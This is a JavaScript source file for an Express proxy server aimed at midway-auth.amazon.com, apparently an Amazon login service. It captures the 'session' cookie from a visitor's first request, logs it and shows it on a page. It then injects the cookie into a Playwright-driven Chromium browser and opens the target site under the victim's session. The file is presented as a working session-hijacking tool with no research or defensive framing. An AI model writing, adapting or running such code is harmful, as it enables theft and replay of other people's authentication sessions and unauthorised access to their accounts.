import express from "express";
import { chromium } from "playwright";
import { createProxyMiddleware } from "http-proxy-middleware";
const app = express();
// Constants
const TARGET_DOMAIN = "midway-auth.amazon.com";
const TARGET_URL = "https://" + TARGET_DOMAIN;
const PORT = 3000;

// Enable proxy trust
app.enable("trust proxy");

// Proxy configuration options
const proxyOptions = {
  target: TARGET_URL,
  changeOrigin: true,
  secure: false,
};

let collected_cookies = null;

// Middleware to handle cookies the client sends out the get request with the cookies to the server
app.use((req, res, next) => {
  console.log(`Request URL: ${req.url}`);
  console.log(collected_cookies);
  //if the cookies are already collected then redirect to the home page
  if (!(collected_cookies === null)) {
    launchBrowser(collected_cookies["session"]);
    return next();
  }
  if (req.method === "GET") {
    // console.log(`Captured GET request: ${req.url}`);

    // Forward client cookies if present
    if (req.headers["cookie"]) {
      collected_cookies = parseCookies(req.headers.cookie);
      launchBrowser(collected_cookies["session"]);
      return res.redirect("/");
    }
  }

  next();
});

function parseCookies(cookieString) {
  return cookieString.split(";").reduce((acc, cookie) => {
    const [name, value] = cookie.split("=").map((c) => c.trim());
    acc[name] = value;
    return acc;
  }, {});
}

const launchBrowser = async (session_token) => {
  console.log("Launching Browser");
  // console.log(session_token);
  let session_cookie = {
    name: "session",
    value: session_token,
    domain: TARGET_DOMAIN,
    path: "/",
  };
  const browser = await chromium.launch({ headless: false });
  const context = await browser.newContext();
  console.log("Adding cookies");
  console.log(session_cookie);
  await context.addCookies([session_cookie]);
  const page = await context.newPage();
  await page.goto(TARGET_URL);
  await new Promise((resolve) => setTimeout(resolve, 20000));
  await browser.close();
};
app.get("/", (req, res) => {
  res.send(`
    <h1>Redirected Locally</h1>
    <p>session token: ${collected_cookies["session"]}</p>
  `);
});

// Create and apply the proxy middleware
const authProxy = createProxyMiddleware(proxyOptions);
app.use("/midway", authProxy);

// Generic error handler
app.use((err, req, res, next) => {
  console.error("Application Error:", err);
  res.status(500).send("Internal Server Error");
});

// Start the server
app.listen(PORT, () => {
  console.log(`Proxy server running on http://localhost:${PORT}`);
  console.log(`Proxying requests from /login to ${TARGET_URL}`);
});

// Handle process termination
process.on("SIGINT", () => {
  console.log("Shutting down proxy server...");
  process.exit();
});
